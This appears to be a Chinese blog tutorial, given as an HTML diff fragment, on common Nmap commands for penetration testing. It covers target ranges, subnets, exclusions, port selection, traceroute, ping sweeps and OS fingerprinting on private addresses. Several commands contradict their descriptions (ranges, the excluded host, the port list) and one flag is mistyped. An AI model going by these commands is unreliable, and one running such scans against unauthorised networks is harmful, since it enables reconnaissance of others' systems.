+<h4 id="三、Nmap常用方法"><a href="#三、Nmap常用方法" class="headerlink" title="三、Nmap常用方法"></a>三、Nmap常用方法</h4><p>Nmap的参数较多，但是通常用不了那么多，以下是在渗透测试过程中比较常见的命令。</p>
+<h5 id="1、扫描单个目标地址："><a href="#1、扫描单个目标地址：" class="headerlink" title="1、扫描单个目标地址："></a>1、扫描单个目标地址：</h5><p>在Nmap后面直接添加目标地址即可扫描，如下所示：</p>
+<pre><code class="python">nmap 192.168.0.100</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/2021022821521149.png" alt="在这里插入图片描述"></p>
+<h5 id="2、扫描多个目标地址："><a href="#2、扫描多个目标地址：" class="headerlink" title="2、扫描多个目标地址："></a>2、扫描多个目标地址：</h5><p>如果目标地址不在同一网段，或在同一网段但不连续且数量不多，可以使用该方法进行扫描，如下所示：</p>
+<pre><code class="python">nmap 192.168.0.1 192.168.0.6</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/2021022822003825.png" alt="在这里插入图片描述"></p>
+<h5 id="3、扫描一个范围内的目标地址："><a href="#3、扫描一个范围内的目标地址：" class="headerlink" title="3、扫描一个范围内的目标地址："></a>3、扫描一个范围内的目标地址：</h5><p>可以指定扫描一个连续的网段，中间使用“-”连接，例如，下列命令表示扫描范围为192.168.0.100~192.168.0.110，如下所示：</p>
+<pre><code class="python">nmap 192.168.0.1-6</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210228220838312.png" alt="在这里插入图片描述"></p>
+<h5 id="4、扫描目标地址所在的某个网段："><a href="#4、扫描目标地址所在的某个网段：" class="headerlink" title="4、扫描目标地址所在的某个网段："></a>4、扫描目标地址所在的某个网段：</h5><p>以C段为例，如果目标是一个网段，则可以通过添加子网掩码的方式扫描，下列命令表示扫描范围为192.168.0.1～192.168.0.255，如下所示：</p>
+<pre><code class="python">nmap 192.168.0.100/24</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210228221059968.png" alt="在这里插入图片描述"></p>
+<h5 id="5、扫描主机列表targets-txt中的所有目标地址："><a href="#5、扫描主机列表targets-txt中的所有目标地址：" class="headerlink" title="5、扫描主机列表targets.txt中的所有目标地址："></a>5、扫描主机列表targets.txt中的所有目标地址：</h5><p>扫描 targets.txt 中的地址或者网段，此处导入的是绝对路径，如果 targets.txt 文件与 nmap.exe 在同一个目录下，则直接引用文件名即可，如下所示：</p>
+<pre><code class="bash">nmap -iL C:\Users\smk\Desktop\targets.txt</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210228222647502.png" alt="在这里插入图片描述"></p>
+<h5 id="6、扫描除某一个目标地址之外的所有目标地址："><a href="#6、扫描除某一个目标地址之外的所有目标地址：" class="headerlink" title="6、扫描除某一个目标地址之外的所有目标地址："></a>6、扫描除某一个目标地址之外的所有目标地址：</h5><p>下列命令表示扫描除192.168.0.105之外的其他192.168.0.x地址，从扫描结果来看确实没有对192.168.0.105进行扫描，如下所示：</p>
+<pre><code class="python">nmap 192.168.0.100/24 -exclude 192.168.0.1</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210228223048405.png" alt="在这里插入图片描述"></p>
+<h5 id="7、扫描除某一文件中的目标地址之外的目标地址："><a href="#7、扫描除某一文件中的目标地址之外的目标地址：" class="headerlink" title="7、扫描除某一文件中的目标地址之外的目标地址："></a>7、扫描除某一文件中的目标地址之外的目标地址：</h5><p>下列命令表示扫描除了target.txt文件夹中涉及的地址或网段之外的目标地址。还是以扫描192.168.0.x网段为例，在targets.txt中添加192.168.0.100和192.168.0.105，从扫描结果来看已经证实该方法有效可用，如下所示：</p>
+<pre><code class="python">nmap 192.168.0.100/24 -excludefile C:\Users\smk\Desktop\targets.txt</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210228223717135.png" alt="在这里插入图片描述"></p>
+<h5 id="8、扫描某一目标地址的21、22、23、80端口："><a href="#8、扫描某一目标地址的21、22、23、80端口：" class="headerlink" title="8、扫描某一目标地址的21、22、23、80端口："></a>8、扫描某一目标地址的21、22、23、80端口：</h5><p>如果不需要对目标主机进行全端口扫描，只想探测它是否开放了某一端口，那么使用-p参数指定端口号，将大大提升扫描速度，如下所示：</p>
+<pre><code class="python">nmap 192.168.0.6 -p 135,443,445</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210228231610466.png" alt="在这里插入图片描述"> </p>
+<h5 id="9、对目标地址进行路由跟踪："><a href="#9、对目标地址进行路由跟踪：" class="headerlink" title="9、对目标地址进行路由跟踪："></a>9、对目标地址进行路由跟踪：</h5><p>下列命令表示对目标地址进行路由跟踪，如下所示：</p>
+<pre><code class="python">nmap --traceroute 192.168.0.6</code></pre>
+<h5 id="10、扫描目标地址所在C段的在线状况："><a href="#10、扫描目标地址所在C段的在线状况：" class="headerlink" title="10、扫描目标地址所在C段的在线状况："></a>10、扫描目标地址所在C段的在线状况：</h5><p>下列命令表示扫描目标地址所在C段的在线状况，如下所示：</p>
+<pre><code class="python">nmap -sP 192.168.0.100/24</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210301001240550.png" alt="在这里插入图片描述"></p>
+<h5 id="11、目标地址的操作系统指纹识别："><a href="#11、目标地址的操作系统指纹识别：" class="headerlink" title="11、目标地址的操作系统指纹识别："></a>11、目标地址的操作系统指纹识别：</h5><p>下列命令表示通过指纹识别技术识别目标地址的操作系统的版本，如下所示：</p>
+<pre><code class="python">nmap -O 192.168.0.6</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210301001440818.png" alt="在这里插入图片描述"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2058751973@qq.com </span>
